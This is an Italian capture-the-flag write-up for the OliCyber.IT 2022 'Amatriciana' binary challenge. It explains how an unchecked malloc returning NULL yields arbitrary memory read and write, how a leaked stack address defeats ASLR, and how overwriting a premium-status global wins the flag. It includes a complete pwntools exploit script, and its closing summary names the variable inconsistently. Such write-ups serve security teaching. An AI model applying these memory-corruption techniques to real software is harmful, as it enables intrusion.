# OliCyber.IT 2022 - Competizione nazionale

## [binary-4] Amatriciana (4 risoluzioni)

La challengepresenta innanzitutto un meraviglioso gabibbo che offre un piatto di pasta all'amatriciana.
Dopo questa immagine bucolica, offre all'utente la possibilità di immagazzinare matrici di numeri reali in double precision e farci dei calcoli. Guardando il sorgente si vede abbastanza in fretta che per ottenere la flag bisogna essere utenti premium e utilizzare la funzione numero 6 del menù, prodotto fra matrici. Purtroppo però non esiste modo lecito di diventare utente premium.

### Soluzione

Notiamo che nella funzione `new_matrix` viene volontariamente leakato un indirizzo. L'indirizzo in questione è sullo stack perché è l'indirizzo di una variabile locale, ma permetterà abbinato ad altri bug di bypassare l'ASLR.

L'errore fatale in questo caso sta nella seguente riga.

```c
  mat->elem = malloc(sizeof(double)*ncols*nrows);
```

L'errore non è tanto qui, quanto nel fatto che nessuno controlla se `malloc` ha ritornato un puntatore valido o `NULL`. Questo è un grosso problema, perché è molto facile fare fallire malloc per volontariamente fargli restituire `NULL`, basta richiedere troppa memoria (e.g. 64GB), che si può ottenere abbastanza facilmente visto che la memoria richiesta è `ncols*nrows*sizeof(double)`. Essendo `ncols` e `nrows` degli interi a 64 bit, basta prendere `ncols = nrows = 2^30` per andare a richiedere un totale di `2^63` bytes di memoria. La richiesta fallirà sicuramente.

La parte interessante è che adesso possiamo leggere e scrivere dove vogliamo in memoria, perché anche se `malloc` è fallito, il programma non lo sa. Per esempio, la funzione `edit_element` permette di fare

```c
  scanf("%le", &mat->elem[row*mat->ncols + col]);
```

Essendo `mat->elem = NULL = 0`, abbiamo una primitiva di scrittura. Possiamo scrivere esattamente 8 bytes ad un indirizzo arbitrario allineato a 8 bytes, in quanto andremo a scrivere direttamente all'indirizzo `8*(row*mat->ncols + col)`. Notare che questo valore varia fra `0` e `2^63`. Dato che gli indirizzi in userspace hanno solo gli ultimi 48 bit diversi da zero, abbiamo a tutti gli effetti scrittura arbitraria. Allo stesso modo, `print_element` permette di leggere ad indirizzi mappati arbitrari per lo stesso motivo

```c
  printf("%.20e\n", mat->elem[row*mat->ncols + col]);
```

La strategia è quindi:

- allocare una matrice troppo grossa, meglio se è `2^30*2^30`
- leggere qualcosa sullo stack usando il leak di informazioni per bypassare ASLR
- scrivere un valore qualsiasi diverso da 0 sulla variabile globale `is_premium`, che sta nella sezione `.bss` del binario. Questo vuol dire che, sapendo l'indirizzo base del binario sappiamo anche l'indirizzo di questa variabile.
- fare un finto prodotto fra matrici e ottenere la flag
- guardare di nuovo il banner del Gabibbo.

La parte più complicata di tutto questo è probabilmente capire la specifica IEEE 754 che definisce come viene interpretata una sequenza di 8 bytes come numero reale. Per fortuna esistono `struct.pack` e `struct.unpack` che sono funzioni builtin del python che permettono agilmente di effettuare la trasformazione. Abbinate a `u64` e `p64` di pwntools permettono di avere il numero intero che ne è la rappresentazione.

### Exploit

```py
#!/usr/bin/env python3
from pwn import ELF, context, process, ui, log, u64, p64, args, remote
from struct import pack as spack, unpack as sunpack
from pathlib import Path

wd = Path(__file__).parent.resolve() / "src"
exe = context.binary = ELF(wd / "amatriciana")
remotehost = ("amatriciana.challs.olicyber.it", 12302)


def menu(io, choice: int):
    io.recvuntil(b"8) Esci\n")
    io.sendline(f"{choice}".encode())


def newmat(io, rows: int, cols: int, name: str):
    menu(io, 0)
    io.sendlineafter(b"colonne?", f"{rows} {cols}".encode())
    io.sendlineafter(b"a questa matrice?\n", name.encode())
    io.recvuntil(b"successo\n")
    io.recvuntil(b"nrows: ")
    return int(io.recvline(False).decode(), 16)


def print_mat_short(io, nmat: int):
    menu(io, 2)
    io.sendlineafter(b"Quale matrice?\n", f"{nmat}")
    return io.recvline()


def arb_read(addr: int):
    log.info(f"Adesso leggo all'indirizzo {addr:#018x}")
    if addr % 8 != 0:
        log.error("Vogliamo indirizzi multipli di sizeof(double) = 8")
    addr //= 8
    menu(io, 3)
    io.sendlineafter(b"matrice?", f"{bigmat}".encode())
    row = addr // bigrow
    col = addr % bigrow
    log.debug(f"Requesting pos {row:#x} {col:#x}")
    io.sendlineafter(b"elemento?\n", f"{row} {col}".encode())
    return io.recvline(False)


def arb_write(addr: int, value: int):
    if addr % 8 != 0:
        log.error("Vogliamo indirizzi allineati a 8")
    addr //= 8
    menu(io, 4)
    io.sendlineafter(b"matrice?", f"{bigmat}".encode())
    row = addr // bigrow
    col = addr % bigrow
    log.debug(f"Requesting pos {row:#x} {col:#x}")
    io.sendlineafter(b"elemento?", f"{row} {col}".encode())

    sending = sunpack("<d", p64(value))[0]
    io.sendline(f"{sending:.20e}".encode())


def get_flag(io):
    menu(io, 6)
    io.sendlineafter(b"matrici?\n", b"0 1")
    io.recvuntil(b"accontentati\n")
    flag = io.recvline(False)
    log.success(f"Flag: {flag.decode()}")
    return flag


if __name__ == "__main__":
    io = process([exe.path], env={"FLAG": "flag{cusumano}"}, cwd=wd) if not args.REMOTE else remote(*remotehost)
    # ui.pause()
    addr = newmat(io, 1, 1, "cusumano")
    log.info(f"Leaked addr: {addr:#016x}")
    # Here we have main
    main_p78 = addr + 0x60

    bigrow = (1 << 30)
    bigmat = 1
    newmat(io, bigrow, bigrow, "manuele")
    leaked = arb_read(main_p78)
    leak_addr = u64(spack("<d", float(leaked)))
    log.info(f"Float number leaked: {leaked}, converted to addr {leak_addr:#016x}")
    exe.address = leak_addr - exe.sym.main
    log.success(f"Leaked address of exe: {exe.address:#016x}")
    arb_write(exe.sym.is_premium, 1)
    get_flag(io)

    io.close()
```

### Flag

Il programma leaka da solo delle informazioni, con quello si rompe ASLR.
Poi il programma alloca con malloc matrici di dimensione decisa dall'utente, ma non controlla se malloc fallisce.
Se chiedi una matrice abbastanza grande, malloc fallisce e tu riesci a scrivere dove vuoi.
Sovrascrivi una variabile globale (`is_admin`) e hai vinto.
